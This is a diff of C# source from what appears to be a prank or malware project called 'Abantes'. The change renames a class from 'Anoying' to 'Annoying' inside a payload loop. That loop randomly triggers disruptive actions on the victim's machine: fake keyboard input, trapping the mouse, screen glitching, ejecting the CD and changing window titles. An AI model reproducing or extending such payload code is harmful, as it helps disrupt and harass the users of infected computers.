@@ -21,17 +21,17 @@ namespace Abantes.Payloads
         static Random _random = new Random();
         public static void MainPayloadThread()
         {
-            Thread cursoricon = new Thread(new ThreadStart(Anoying.CursorIcon));
+            Thread cursoricon = new Thread(new ThreadStart(Annoying.CursorIcon));
             while (true)
             {
                 switch (_random.Next(10))
                 {
                     case 0:
-                        Thread randomOSsound = new Thread(new ThreadStart(Anoying.RandomOSSounds));
+                        Thread randomOSsound = new Thread(new ThreadStart(Annoying.RandomOSSounds));
                         randomOSsound.Start();
                         break;
                     case 1:
-                        Thread randomKeyboard = new Thread(new ThreadStart(Anoying.RandomKeyboard));
+                        Thread randomKeyboard = new Thread(new ThreadStart(Annoying.RandomKeyboard));
                         randomKeyboard.Start();
                         break;
                     case 2:
@@ -41,7 +41,7 @@ namespace Abantes.Payloads
                         }
                         else
                         {
-                            Anoying.ChangeWindowText();
+                            Annoying.ChangeWindowText();
                         }
                         break;
                     case 3:
@@ -50,34 +50,34 @@ namespace Abantes.Payloads
                     case 4:
                         if (_random.Next(100) > 50)
                         {
-                            Thread mouseTrap = new Thread(new ThreadStart(Anoying.MouseTrap));
+                            Thread mouseTrap = new Thread(new ThreadStart(Annoying.MouseTrap));
                             mouseTrap.Start();
                         }
                         else
                         {
-                            Anoying.ChangeWindowText();
+                            Annoying.ChangeWindowText();
                         }
                         break;
                     case 5:
-                        Anoying.ChangeWindowText();
+                        Annoying.ChangeWindowText();
                         break;
                     case 6:
-                        Anoying.EjectCd();
+                        Annoying.EjectCd();
                         break;
                     case 7:
-                        Thread screenscrew = new Thread(new ThreadStart(Anoying.Screen_Screw));
+                        Thread screenscrew = new Thread(new ThreadStart(Annoying.Screen_Screw));
                         screenscrew.Start();
                         break;
                     case 8:
-                        Thread screenglitch = new Thread(new ThreadStart(Anoying.Screen_Glitching));
+                        Thread screenglitch = new Thread(new ThreadStart(Annoying.Screen_Glitching));
                         screenglitch.Start();
                         break;
                     case 9:
-                        Thread helpicons = new Thread(new ThreadStart(Anoying.Display_Icons_Error));
+                        Thread helpicons = new Thread(new ThreadStart(Annoying.Display_Icons_Error));
                         helpicons.Start();
                         break;
                     case 10:
-                        Thread crazybounce = new Thread(new ThreadStart(Anoying.CrazyBounce));
+                        Thread crazybounce = new Thread(new ThreadStart(Annoying.CrazyBounce));
                         crazybounce.Start();
                         break;
                 }
@@ -94,7 +94,7 @@ namespace Abantes.Payloads
             }
         }
     }
-    class Anoying
+    class Annoying
     {
         [DllImport("user32.dll")]
         static extern int SetWindowText(IntPtr hWnd, string text);
